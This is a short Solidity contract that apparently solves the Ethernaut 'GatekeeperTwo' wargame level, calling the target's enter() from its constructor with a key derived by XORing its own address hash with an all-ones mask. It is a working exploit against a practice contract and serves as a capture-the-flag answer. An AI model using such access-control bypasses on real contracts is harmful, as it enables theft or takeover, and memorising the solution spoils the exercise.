// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatebreakerTwo {
    constructor(address _gatekeeper) {
        IGatekeeperTwo gate = IGatekeeperTwo(_gatekeeper);
        bytes8 key;
        unchecked {
            uint64 mask = uint64(0) - 1; 
            bytes8 hash = bytes8(keccak256(abi.encodePacked(address(this))));  
            key = bytes8(uint64(hash) ^ mask);
        }
        gate.enter(key);
    }
}